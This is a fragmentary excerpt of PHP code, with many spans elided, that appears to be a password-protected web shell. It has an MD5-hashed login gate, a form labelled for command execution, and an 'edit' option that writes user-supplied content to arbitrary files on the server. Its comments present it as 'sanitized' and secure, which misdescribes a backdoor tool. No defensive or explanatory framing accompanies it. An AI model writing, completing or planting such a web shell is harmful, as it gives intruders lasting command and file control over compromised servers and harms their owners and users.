...
// Hashing password (change this to a secure password)
$hashed_password = 'a8322b94b079d8476a182c60ab91beb2'; // MD5 hashed password

// Function to sanitize user input (for additional security)
...
if (!isset($_SESSION['logged_in'])) {
    if (!isset($_POST['password']) || md5(sanitize_input($_POST['password'])) != $hashed_password) {
        echo '<style>
...
echo '<style>
    ...
    input[type="text"], input[type="password"], input[type="url"], input[type="submit"] { padding: 10px; margin: 10px; width: 300px; border-radius: 5px; border: none; }
...
// Command execution form (sanitized input)
...
if (isset($_GET['option'])) {
    ...
    if ($option == 'edit') {
        if (isset($_POST['content'])) {
            file_put_contents($file, sanitize_input($_POST['content']));
        }
        echo '<form method="post">
